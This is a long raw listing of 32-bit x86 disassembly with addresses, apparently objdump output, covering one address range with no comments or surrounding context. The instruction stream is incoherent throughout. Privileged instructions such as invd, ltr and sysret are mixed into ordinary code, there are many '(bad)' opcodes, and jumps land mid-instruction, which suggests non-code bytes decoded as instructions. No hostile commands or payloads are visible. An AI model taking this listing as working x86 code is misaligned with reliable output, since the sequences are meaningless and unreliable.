  432452:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432459:	rol    BYTE PTR [ebp+0x45],1
  43245c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432462:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432468:	push   ebx
  432469:	add    BYTE PTR [eax+eax*1+0x51],dl
  43246d:	jge    0x4324a2
  43246f:	add    BYTE PTR [esi+0x4],dl
  432472:	jne    0x4324d9
  432474:	mov    edx,0x457200
  432479:	jmp    0x43243d
  43247b:	xor    edi,DWORD PTR [ebx]
  43247d:	pop    edi
  43247e:	cvtdq2ps xmm7,xmm0
  432481:	ret    0x0
  432484:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43248a:	xor    ecx,DWORD PTR [edi]
  43248c:	add    eax,DWORD PTR [ecx+0x3b]
  43248f:	push   ebx
  432490:	rdpmc  
  432492:	out    0x8d,al
  432494:	add    BYTE PTR [eax],cl
  432496:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43249c:	ret    0x450c
  43249f:	sbb    al,0x8b
  4324a1:	cmp    eax,esi
  4324a3:	or     cl,al
  4324a5:	or     al,0xc2
  4324a7:	pop    eax
  4324a8:	inc    ebp
  4324a9:	add    ecx,DWORD PTR [edi]
  4324ab:	add    esi,DWORD PTR [ebp+0x39]
  4324ae:	invd   
  4324b0:	jge    0x4324bc
  4324b2:	mov    eax,0x478ac0
  4324b7:	cli    
  4324b8:	xor    esp,ecx
  4324ba:	mov    ebx,0x5b8ac0
  4324bf:	ret    0x33
  4324c2:	mov    eax,0x833b8b
  4324c7:	sub    BYTE PTR [ebx],al
  4324c9:	inc    ebp
  4324ca:	xor    ax,di
  4324cd:	pushf  
  4324ce:	inc    bh
  4324d0:	mov    esp,esp
  4324d2:	hlt    
  4324d3:	test   DWORD PTR [ebp-0x8],esi
  4324d6:	mov    eax,DWORD PTR [ebp-0x14]
  4324d9:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324df:	dec    edi
  4324e0:	or     BYTE PTR [eax],al
  4324e2:	jne    0x43246d
  4324e4:	mov    esi,esp
  4324e6:	call   0x77a9b0ab
  4324eb:	inc    ebp
  4324ec:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324f2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324f8:	add    BYTE PTR [esi+0x7d],ah
  4324fb:	inc    ebp
  4324fc:	mov    bx,WORD PTR [ebp+0x8]
  432500:	add    DWORD PTR [ebp+0x54],0x30c008b
  432507:	inc    ebp
  432508:	mov    bx,di
  43250b:	lock test BYTE PTR [ecx+0x7000801],bh
  432512:	jge    0x4324d5
  432514:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  43251a:	cli    
  43251b:	xor    bl,bh
  43251d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432523:	test   BYTE PTR [eax],cl
  432525:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43252c:	cmp    ebp,eax
  43252e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432535:	test   BYTE PTR [ebp+0x1],bh
  432538:	mov    ebx,0x458a00
  43253d:	xor    esi,DWORD PTR [ebx]
  43253f:	add    esp,DWORD PTR [esi-0x77]
  432542:	pop    ebp
  432543:	loopne 0x4325ab
  432545:	inc    ebp
  432546:	clc    
  432547:	xor    edi,DWORD PTR [ebx]
  432549:	add    esi,DWORD PTR [edx-0x77]
  43254c:	data16 fdivr QWORD PTR [ebp-0x49]
  432550:	mov    ebx,0xb78afc
  432555:	hlt    
  432556:	xor    edi,DWORD PTR [esi+eiz*2]
  432559:	add    BYTE PTR [ebp+0x66],bl
  43255c:	data16 lock clc 
  43255f:	cmp    al,0x3b
  432561:	add    BYTE PTR [edi+0x66],dh
  432564:	psubq  mm7,QWORD PTR [ebp+0x2]
  432568:	ltr    WORD PTR [ebp+0x66]
  43256c:	add    esi,eax
  43256e:	add    di,WORD PTR [ebp+0x2b]
  432572:	data16 data16 jge 0x4325f3
  432576:	mov    ebx,0xe08a8b
  43257b:	jge    0x4325b0
  43257d:	data16 data16 xor al,0x5d
  432581:	data16 data16 jne 0x43257d
  432585:	mov    edi,DWORD PTR [ebx]
  432587:	fdiv   QWORD PTR [edx+0x7d]
  43258a:	data16 data16 jge 0x4325c2
  43258e:	mov    ebx,0x758a66
  432593:	mov    esi,0x667233
  432598:	pop    ebp
  432599:	or     BYTE PTR [esi+0x0],ah
  43259c:	clc    
  43259d:	mov    edi,DWORD PTR [ebx]
  43259f:	lock ja 0x43252d
  4325a2:	(bad)  
  4325a4:	jge    0x43259d
  4325a6:	invd   
  4325a8:	pop    ebp
  4325a9:	add    BYTE PTR [ebx],al
  4325ab:	(bad)  
  4325ac:	cmp    di,WORD PTR [ebp+0xf]
  4325b0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4325b4:	mov    bx,WORD PTR [ebp-0x10]
  4325b8:	pop    bp
  4325ba:	fbstp  TBYTE PTR [ebx]
  4325bc:	test   DWORD PTR [ebx],eax
  4325be:	add    BYTE PTR [ebx],bh
  4325c0:	add    BYTE PTR [esi+0x7d],ah
  4325c3:	jge    0x432550
  4325c5:	data16 in al,dx
  4325c7:	pop    ebp
  4325c8:	stc    
  4325c9:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325d0:	mov    edi,ebx
  4325d2:	in     al,dx
  4325d3:	test   BYTE PTR [ebp+0x0],bh
  4325d6:	mov    eax,DWORD PTR [eax]
  4325d8:	call   0xbd401f68
  4325dd:	cmp    al,0x9b
  4325df:	add    BYTE PTR [edx],dh
  4325e1:	mov    bx,di
  4325e4:	call   0x8b4ba374
  4325e9:	add    ebp,esp
  4325eb:	mov    bx,di
  4325ee:	jnp    0x432616
  4325f0:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325f6:	mov    eax,DWORD PTR [eax]
  4325f8:	call   0x7c3eb163
  4325fd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432603:	data16 data16 fistp WORD PTR [ebp+0xe]
  432608:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  432612:	fisttp WORD PTR [ecx-0x7401f77b]
  432618:	(bad)  
  432619:	cld    
  43261a:	jne    0x432658
  43261c:	xor    eax,DWORD PTR [eax]
  43261e:	mov    esp,DWORD PTR [esi-0x10]
  432621:	sti    
  432622:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432629:	data16 adc bl,bh
  43262c:	push   ebp
  43262d:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432634:	mov    WORD PTR [eax],es
  432636:	fwait
  432637:	data16 xor bh,bl
  43263a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  432640:	mov    esp,DWORD PTR [esi-0x14]
  432643:	fisttp WORD PTR [ebx-0x3748a9f2]
  432649:	or     al,0x2b
  43264b:	mov    bh,0xba
  43264d:	hlt    
  43264e:	mov    bh,bl
  432650:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432656:	dec    esi
  432657:	or     al,0x0
  432659:	mov    edi,DWORD PTR [ebx]
  43265b:	or     BYTE PTR [ebp+0x3b],dh
  43265e:	mov    ecx,DWORD PTR [edi]
  432660:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432666:	xor    al,0xd8
  432668:	pop    bp
  43266a:	lock xor esi,DWORD PTR [ebx]
  43266d:	lea    esp,[esi+0x1f]
  432670:	icebp  
  432671:	jb     0x432677
  432673:	add    al,al
  432675:	jge    0x432683
  432677:	mov    eax,eax
  432679:	fsubr  st,st(3)
  43267b:	pop    ebp
  43267c:	mov    esi,DWORD PTR [ebx]
  43267e:	in     al,0x8d
  432680:	rcr    DWORD PTR [edi],0xc2
  432683:	jb     0x4326e3
  432685:	add    cl,cl
  432687:	jge    0x432695
  432689:	mov    edx,DWORD PTR [ebp-0x20]
  43268c:	in     al,dx
  43268d:	pop    ebp
  43268e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  432693:	cmp    di,WORD PTR [ebp+0x0]
  432697:	mov    ebp,DWORD PTR [ebx]
  432699:	fdivr  QWORD PTR [esi+0x668a5d]
  43269f:	cmp    al,0x33
  4326a1:	mov    si,0x4e7d
  4326a5:	mov    eax,DWORD PTR [eax]
  4326a7:	lock inc ebp
  4326a9:	mov    esi,DWORD PTR [eax]
  4326ab:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4326b2:	clc    
  4326b3:	(bad)  
  4326b4:	cmp    edi,DWORD PTR [ebx]
  4326b6:	je     0x4326c7
  4326b8:	push   ebx
  4326b9:	loopne 0x4326ca
  4326bb:	dec    ecx
  4326bd:	mov    esp,DWORD PTR [ebp-0x1c]
  4326c0:	int    0xf1
  4326c2:	mov    esi,0x703084d
  4326c7:	pcmpgtd mm6,mm1
  4326ca:	add    BYTE PTR [ebp+0x66],dh
  4326cd:	jmp    0x43269a
  4326cf:	mov    eax,DWORD PTR [ebx]
  4326d1:	lock push ebp
  4326d3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326d9:	or     bh,dl
  4326db:	jb     0x4326db
  4326dd:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326e3:	loopne 0x4326e5
  4326e5:	jne    0x4326e9
  4326e7:	data16 add BYTE PTR [esi+eiz*2],dh
  4326eb:	mov    ecx,ebx
  4326ed:	data16 cmp al,0xf1
  4326f0:	add    BYTE PTR [esi+eiz*2],bh
  4326f3:	add    bl,cl
  4326f5:	retw   0xf2
  4326f9:	ret    0x66
  4326fc:	retf   
  4326fd:	enterw 0x4df1,0x19
  432702:	pop    edi
  432703:	jne    0x432686
  432705:	mov    esi,DWORD PTR [eax]
  432707:	call   0x77b7b2a8
  43270c:	xor    ebp,DWORD PTR [ebx]
  43270e:	lea    esp,[esi+0x48]
  432711:	repnz in eax,0x3b
  432714:	add    BYTE PTR [ebp-0x37],dh
  432717:	xor    edx,DWORD PTR [ebp-0x15]
  43271a:	in     al,dx
  43271b:	xor    edx,DWORD PTR [esi+0x40]
  43271e:	mov    DWORD PTR [edi],0x338545fc
  432724:	clc    
  432725:	add    esi,DWORD PTR [ecx]
  432727:	pop    edi
  432728:	pushf  
  432729:	pop    ebx
  43272a:	call   0xff4426f1
  43272f:	mov    edi,eax
  432731:	push   ecx
  432732:	pop    es
  432733:	mov    edi,DWORD PTR [eax]
  432735:	push   esi
  432736:	inc    esi
  432737:	add    bh,BYTE PTR [esi+0x0]
  43273a:	popa   
  43273b:	data16 (bad) 
  43273d:	into   
  43273e:	gs cmp al,0xcd
  432741:	add    BYTE PTR [ecx+0x7ce0866],bh
  432747:	ret    0x66
  43274a:	add    bh,al
  43274c:	add    bh,ah
  43274e:	add    BYTE PTR [ebp+0x31c3f866],al
  432754:	cmp    al,0x9c
  432756:	add    BYTE PTR [esi+0x66],ah
  432759:	into   
  43275a:	ret    
  43275b:	pop    ebp
  43275c:	adc    BYTE PTR [edi+0x0],dl
  43275f:	mov    bh,0x66
  432761:	mov    edi,0xff038dc3
  432766:	jne    0x4327bc
  432768:	lea    edx,[ecx+0x1]
  43276b:	mov    ebx,0xd64ff1
  432770:	sar    DWORD PTR [ebx],1
  432772:	test   BYTE PTR [ebp+0x36],dh
  432775:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432779:	push   edi
  43277a:	xor    BYTE PTR [ebx],0x38
  43277d:	mov    esi,ebx
  43277f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432785:	ss inc ebp
  432787:	fs pop ebx
  432789:	mov    ebx,0x9c3b30
  43278e:	je     0x4327bb
  432790:	xor    edi,DWORD PTR [ebx+0x668a33]
  432796:	mov    WORD PTR [ebx],?
  432798:	ss mov ebx,0x8b4e64
  43279e:	pop    edi
  43279f:	cmp    ecx,ecx
  4327a1:	jne    0x4327f8
  4327a3:	mov    ebp,esp
  4327a5:	cld    
  4327a6:	push   esi
  4327a7:	pop    ebx
  4327a8:	inc    ebp
  4327a9:	stc    
  4327aa:	xor    BYTE PTR [ebp+0x9bef89c],al
  4327b0:	test   esi,ecx
  4327b2:	clc    
  4327b3:	test   dl,dl
  4327b5:	cmp    bh,bh
  4327b7:	fs pop si
  4327ba:	or     bl,al
  4327bc:	add    cl,BYTE PTR [ebx+0x57665100]
  4327c2:	retf   0x3c45
  4327c5:	xor    BYTE PTR [eax],al
  4327c7:	pushf  
  4327c8:	mov    si,0x85ca
  4327cc:	ret    0xf8
  4327cf:	pop    ebx
  4327d0:	dec    dx
  4327d3:	mov    edx,DWORD PTR [edi-0x76]
  4327d6:	push   edi
  4327d7:	add    al,0xb7
  4327d9:	xor    al,0xba
  4327db:	cmp    al,0x8d
  4327dd:	je     0x4327de
  4327df:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327e3:	lea    edi,[ebx+0x544fff]
  4327e9:	push   ecx
  4327ea:	cmp    edx,DWORD PTR [ebx+0x75]
  4327ed:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327f3:	add    BYTE PTR [ebx],dh
  4327f5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327fb:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  432802:	mov    ebx,0x3b3b00
  432807:	jne    0x432834
  432809:	mov    DWORD PTR [ebx+0x728afc],edi
  43280f:	xor    esi,DWORD PTR [ebx]
  432811:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432817:	push   edi
  432818:	cmp    esp,ebp
  43281a:	jne    0x43281c
  43281c:	sbb    DWORD PTR [eax],0x8085c3fc
  432822:	clc    
  432823:	inc    esi
  432824:	pop    ebx
  432825:	sti    
  432826:	add    eax,0xeb8bc075
  43282b:	cld    
  43282c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432832:	mov    ecx,DWORD PTR [ecx+edx*2]
  432835:	rol    DWORD PTR [ebp-0x37],0xf
  432839:	mov    DWORD PTR [eax],ecx
  43283b:	inc    edi
  43283c:	(bad)  
  43283d:	in     eax,0xfe
  43283f:	add    bh,bh
  432841:	(bad)  
  432842:	mov    esi,0xc38a5e
  432847:	mov    esi,DWORD PTR [ebx]
  432849:	push   ecx
  43284a:	mov    edi,0xfc4ec7
  43284f:	test   DWORD PTR [ebp-0x8],edx
  432852:	xor    di,ax
  432855:	pushf  
  432856:	sub    ebp,eax
  432858:	inc    ebp
  432859:	(bad)  
  43285a:	sub    edi,edi
  43285c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432862:	inc    ebp
  432863:	add    BYTE PTR [esi+0x2b],ah
  432866:	or     bh,BYTE PTR [edx+0xf8ac2]
  43286c:	cmp    al,0x33
  43286e:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432874:	(bad)  
  432875:	cmp    esi,DWORD PTR [ebx]
  432877:	je     0x432831
  432879:	push   ebx
  43287a:	dec    esi
  43287b:	str    ecx
  43287e:	cmp    esp,DWORD PTR [ebp+0x75]
  432881:	int    0x33
  432883:	mov    edi,0x789085f
  432888:	mov    edx,DWORD PTR [eax]
  43288a:	cld    
  43288b:	add    cl,cl
  43288d:	data16 add al,0xcb
  432890:	push   ebp
  432891:	add    ebp,esp
  432893:	jne    0x432881
  432895:	(bad)  
  432896:	mov    DWORD PTR [ecx],0xd685f7ec
  43289c:	clc    
  43289d:	xlat   BYTE PTR ds:[ebx]
  43289e:	inc    ebp
  43289f:	mov    esi,DWORD PTR [edx]
  4328a1:	push   eax
  4328a2:	pushf  
  4328a3:	in     eax,0x8b
  4328a5:	add    ah,ch
  4328a7:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4328ab:	add    ax,0x72cb
  4328af:	cmp    al,0x0
  4328b1:	add    BYTE PTR [ebp+0x66],al
  4328b4:	(bad)  
  4328b5:	retf   
  4328b6:	lock ret 0x85
  4328ba:	clc    
  4328bb:	inc    bp
  4328bd:	retf   
  4328be:	cmp    eax,0xc77d9cc8
  4328c3:	xor    ah,bh
  4328c5:	pushf  
  4328c6:	test   DWORD PTR [edi-0x8],ebx
  4328c9:	je     0x432910
  4328cb:	xor    esi,DWORD PTR ds:0x7020840
  4328d1:	ror    BYTE PTR [ebp-0x37],0x8d
  4328d5:	push   ebp
  4328d6:	add    esp,ebp
  4328d8:	jb     0x432865
  4328da:	add    BYTE PTR [eax],cl
  4328dc:	dec    ebp
  4328dd:	mov    bh,0x81
  4328df:	push   esi
  4328e0:	push   esp
  4328e1:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328e8:	xor    al,BYTE PTR [eax]
  4328ea:	mov    edx,DWORD PTR [edi+0x10]
  4328ed:	(bad)  
  4328ee:	scas   eax,DWORD PTR es:[edi]
  4328ef:	ret    0x3b
  4328f2:	jns    0x3b4425e5
  4328f8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328fc:	dec    ebp
  4328fd:	or     BYTE PTR [ebx],ch
  4328ff:	ret    0x458b
  432902:	lock jmp 0x4328f6
  432905:	mov    ecx,DWORD PTR [eax]
  432907:	or     BYTE PTR [edi],al
  432909:	mov    ecx,eax
  43290b:	xor    DWORD PTR [edx+0x2],0x0
  43290f:	mov    bh,0xc1
  432911:	adc    BYTE PTR [eax],dh
  432913:	iret   
  432914:	inc    ebp
  432915:	mov    DWORD PTR [ebx],0x4dfff8c4
  43291b:	inc    BYTE PTR [ebx]
  43291d:	ret    0xf8
  432920:	adc    DWORD PTR [esi+0x10],esp
  432923:	clc    
  432924:	dec    ecx
  432925:	fisttp WORD PTR [ecx+0x456604c0]
  43292b:	add    dh,BYTE PTR ds:0x75e0845
  432931:	ret    0x4d
  432934:	lea    ecx,[ebx+0x18728301]
  43293a:	add    BYTE PTR [ebp+0x45],al
  43293d:	xor    ecx,ebp
  43293f:	pushf  
  432940:	add    bh,al
  432942:	add    al,ch
  432944:	inc    ebp
  432945:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43294b:	xor    eax,0x781084d
  432950:	push   esp
  432951:	fwait
  432952:	push   ecx
  432953:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432959:	inc    ebp
  43295a:	cmp    edi,DWORD PTR [ecx]
  43295c:	jbe    0x4328fa
  43295e:	mov    eax,edi
  432960:	or     ah,dh
  432962:	inc    ebp
  432963:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432969:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43296f:	in     al,dx
  432970:	hlt    
  432971:	push   esp
  432972:	push   esp
  432973:	push   ecx
  432974:	push   ecx
  432975:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43297b:	fwait
  43297c:	fwait
  43297d:	xor    dh,BYTE PTR [edx]
  43297f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432985:	or     BYTE PTR [ebp+0x7],al
  432988:	mov    eax,ecx
  43298a:	clc    
  43298b:	jb     0x43294e
  43298d:	add    BYTE PTR [ebp+0x55],cl
  432990:	or     DWORD PTR [edi],0xc251d154
  432996:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4329a0:	mov    edi,eax
  4329a2:	or     cl,al
  4329a4:	inc    ebp
  4329a5:	dec    ebp
  4329a6:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4329ac:	or     WORD PTR [ecx],0x899b
  4329b1:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329b7:	mov    edx,DWORD PTR [ecx+0x8]
  4329ba:	mov    eax,DWORD PTR [ebp-0x8]
  4329bd:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329c4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329ca:	inc    ebp
  4329cb:	dec    eax
  4329cc:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329d2:	add    edx,DWORD PTR [ecx-0x8]
  4329d5:	mov    ecx,DWORD PTR [ecx]
  4329d7:	clc    
  4329d8:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329df:	mov    ecx,ebp
  4329e1:	clc    
  4329e2:	(bad)  
  4329e3:	popf   
  4329e4:	inc    DWORD PTR [eax]
  4329e6:	ret    0x8b
  4329e9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329ef:	mov    edi,esp
  4329f1:	hlt    
  4329f2:	test   ecx,esi
  4329f4:	clc    
  4329f5:	or     BYTE PTR [ebp+0x7],al
  4329f8:	xor    al,cl
  4329fa:	pushf  
  4329fb:	jb     0x432a30
  4329fd:	add    BYTE PTR [eax-0x3f],al
  432a00:	inc    eax
  432a01:	daa    
  432a02:	inc    ebp
  432a03:	inc    ebp
  432a04:	xor    eax,0x7f80803
  432a09:	dec    ebp
  432a0a:	fwait
  432a0b:	add    esi,DWORD PTR [edx]
  432a0d:	clc    
  432a0e:	cmp    DWORD PTR [ecx],ecx
  432a10:	or     al,0x8
  432a12:	add    al,BYTE PTR [ebp+0x2c]
  432a15:	xor    eax,0x7350845
  432a1a:	or     BYTE PTR [ebp+0x7],cl
  432a1d:	lea    ebx,[ebx-0x748dcdff]
  432a23:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a2a:	mov    edx,DWORD PTR [eax]
  432a2c:	cld    
  432a2d:	dec    ebp
  432a2e:	push   esp
  432a2f:	sub    edx,DWORD PTR [ecx-0x75]
  432a32:	add    eax,0xf172fc
  432a37:	or     BYTE PTR [ebp+0x7],cl
  432a3a:	add    eax,ecx
  432a3c:	or     al,0x72
  432a3e:	add    DWORD PTR [eax],eax
  432a40:	mov    ebx,0x29c2c1
  432a45:	inc    ebp
  432a46:	mov    eax,DWORD PTR [ebx]
  432a48:	cmp    eax,0x3004d1c
  432a4e:	xbegin 0x66c8b648
  432a54:	clc    
  432a55:	or     BYTE PTR [ebp+0x45],al
  432a58:	xor    dh,BYTE PTR ds:0x78b089c
  432a5e:	adc    BYTE PTR [ebp+0x45],cl
  432a61:	lea    eax,[ebp+0x33727501]
  432a67:	add    cl,ch
  432a69:	inc    ebp
  432a6a:	add    bl,ch
  432a6c:	add    BYTE PTR [ebx+0x45850845],cl
  432a72:	je     0x4329ff
  432a74:	push   ebx
  432a75:	or     al,0x85
  432a77:	dec    ebp
  432a78:	std    
  432a79:	mov    bh,bh
  432a7b:	mov    BYTE PTR [ebp-0x75],al
  432a7e:	mov    edi,eax
  432a80:	or     al,0x89
  432a82:	inc    ebp
  432a83:	clc    
  432a84:	mov    esp,esp
  432a86:	hlt    
  432a87:	call   DWORD PTR [edi-0x37]
  432a8a:	push   esp
  432a8b:	or     al,0x51
  432a8d:	push   ebp
  432a8e:	xor    ebp,esp
  432a90:	mov    esi,0x457251
  432a95:	xor    esi,eax
  432a97:	pushf  
  432a98:	inc    ebp
  432a99:	(bad)  
  432a9a:	mov    edi,eax
  432a9c:	or     al,0x85
  432a9e:	add    al,bh
  432aa0:	inc    eax
  432aa2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432aa6:	or     ah,bh
  432aa8:	inc    eax
  432aa9:	push   esp
  432aaa:	jmp    0x432afd
  432aac:	mov    eax,DWORD PTR ds:0xe8720c
  432ab2:	mov    DWORD PTR [ebp-0x8],eax
  432ab5:	jne    0x432afc
  432ab7:	jmp    0x432a44
  432ab9:	mov    ebp,DWORD PTR [eax]
  432abb:	clc    
  432abc:	retf   0xff54
  432abf:	push   ecx
  432ac0:	mov    DWORD PTR ds:0x757210,eax
  432ac6:	mov    ecx,DWORD PTR [ebp-0x4]
  432ac9:	sub    esp,DWORD PTR [ebx-0x77]
  432acc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432ad3:	or     ah,bh
  432ad5:	pop    es
  432ad6:	ds fwait
  432ad8:	push   DWORD PTR [edx]
  432ada:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432ae0:	(bad)  
  432ae1:	mov    bh,bh
  432ae3:	jmp    0x432ad1
  432ae5:	leave  
  432ae6:	jne    0x432af0
  432ae8:	call   0x302442
  432aed:	in     al,dx
  432aee:	dec    ebp
  432aef:	add    dh,BYTE PTR [ebx]
  432af1:	add    BYTE PTR [ebx],al
  432af3:	inc    ebp
  432af4:	cmp    esi,DWORD PTR [ecx]
  432af6:	je     0x432a94
  432af8:	mov    eax,edi
  432afa:	or     al,0xf0
  432afc:	add    BYTE PTR [ebp+0x458bf845],al
  432b02:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b08:	adc    al,0x7
  432b0a:	enter  0x9fc0,0xa5
  432b0e:	rol    BYTE PTR [eax],0x5e
  432b11:	mov    ecx,ecx
  432b13:	or     al,0xc
  432b15:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b1c:	jmp    0x432b1d
  432b1e:	push   ebp
  432b1f:	mov    esp,ebp
  432b21:	cld    
  432b22:	inc    ebp
  432b23:	inc    ebp
  432b24:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b2b:	push   esi
  432b2c:	push   esi
  432b2d:	mov    edi,0x7af080f
  432b32:	add    bh,al
  432b34:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b3a:	add    BYTE PTR [ecx+0x4540100f],cl
  432b40:	mov    ebp,eax
  432b42:	mov    ebp,edi
  432b44:	lock call edx
  432b47:	fcom   DWORD PTR [ebp+0x45]
  432b4a:	mov    eax,0x148a8b
  432b4f:	push   ecx
  432b50:	enter  0xc145,0x83
  432b54:	cmp    ecx,DWORD PTR [eax]
  432b56:	add    BYTE PTR [ebp+0x4d],al
  432b59:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b5f:	call   0xffa326ce
  432b64:	cmp    eax,DWORD PTR [ebp-0xc]
  432b67:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b6b:	push   ebp
  432b6c:	(bad)  
  432b6d:	call   0x342971
  432b72:	mov    bh,0xdb
  432b74:	cld    
  432b75:	or     BYTE PTR [ebp+0x45],bl
  432b78:	(bad)  
  432b79:	call   0xff7d2809
  432b7e:	add    al,BYTE PTR [ebp+0x37]
  432b81:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b87:	jne    0x432b89
  432b89:	(bad)  
  432b8a:	cmp    edi,esp
  432b8c:	jne    0x432bbf
  432b8e:	mov    edi,edi
  432b90:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b96:	pop    ds
  432b97:	into   
  432b98:	je     0x432b5b
  432b9a:	mov    ebx,DWORD PTR [esi]
  432b9c:	or     BYTE PTR [ebp-0x49],al
  432b9f:	mov    esp,DWORD PTR [esi-0x77]
  432ba2:	mov    esi,0x2451f0c
  432ba7:	mov    eax,DWORD PTR [eax]
  432ba9:	or     al,0x66
  432bab:	sar    bl,0x3b
  432bae:	xor    esi,DWORD PTR [ebp+0x66]
  432bb1:	xor    ecx,edi
  432bb3:	pop    edi
  432bb4:	adc    bl,BYTE PTR [ebx+0x7e]
  432bb7:	ret    0xff
  432bba:	cld    
  432bbb:	inc    ebp
  432bbc:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bc2:	cld    
  432bc3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bca:	push   0xffffff83
  432bcc:	pop    edi
  432bcd:	or     BYTE PTR [ebp+0x53],dh
  432bd0:	xorps  xmm1,xmm2
  432bd3:	test   BYTE PTR [eax+eax*1],bh
  432bd6:	add    BYTE PTR [eax],al
  432bd8:	adc    eax,eax
  432bda:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432be2:	jmp    DWORD PTR [eax]
  432be4:	ror    al,0x5e
  432be7:	inc    ebp
  432be8:	leave  
  432be9:	xor    ecx,DWORD PTR [eax]
  432beb:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bf1:	add    ah,al
  432bf3:	xor    edi,edi
  432bf5:	xor    DWORD PTR [ebx],0x66003302
  432bfb:	mov    DWORD PTR [ebp-0xc],ecx
  432bfe:	pcmpgtw mm0,mm0
  432c01:	add    dl,ah
  432c03:	leave  
  432c04:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c08:	push   eax
  432c09:	dec    ebp
  432c0a:	mov    esi,DWORD PTR [ebx-0x75]
  432c0d:	lea    ebp,[eax-0x7c00ff02]
  432c13:	xor    eax,DWORD PTR [eax]
  432c15:	sysret 
  432c17:	dec    ebp
  432c18:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c1f:	push   WORD PTR [ecx+0x8]
  432c23:	jne    0x432be6
  432c25:	ud0    ecx,DWORD PTR [ecx]
  432c28:	mov    eax,edx
  432c2a:	lods   al,BYTE PTR ds:[esi]
  432c2b:	add    BYTE PTR [eax],al
  432c2d:	data16 (bad) 
  432c2f:	iret   
  432c30:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c37:	cli    
  432c38:	inc    ebp
  432c39:	cmp    al,0x8d
  432c3b:	add    BYTE PTR [esi+0x2d],ah
  432c3e:	inc    ebp
  432c3f:	pop    ebp
  432c40:	lea    ecx,[edi]
  432c42:	mov    dl,bh
  432c44:	add    BYTE PTR [edi],cl
  432c46:	mov    DWORD PTR [eax+eax*8],edi
  432c49:	mov    ebx,0x3b87
  432c4e:	add    BYTE PTR [ebx],ch
  432c50:	inc    ebp
  432c51:	data16 (bad) 
  432c53:	clc    
  432c54:	int3   
  432c55:	cmp    eax,DWORD PTR [eax]
  432c57:	je     0x432be2
  432c59:	push   0xffffffc8
  432c5b:	pop    edi
  432c5c:	xchg   DWORD PTR [ebp+0x0],eax
  432c5f:	data16 add BYTE PTR [ebp+0x45],cl
  432c63:	lea    cx,[ebp+0x10]
  432c67:	jb     0x432c69
  432c69:	jmp    0x432bf4
  432c6b:	call   eax
  432c6d:	clc    
  432c6e:	xchg   DWORD PTR [edi+0x1],edi
  432c71:	mov    eax,DWORD PTR [eax]
  432c73:	or     BYTE PTR [ebp-0x49],al
  432c76:	lea    eax,[eax+0x74003154]
  432c7c:	push   edi
  432c7d:	inc    edx
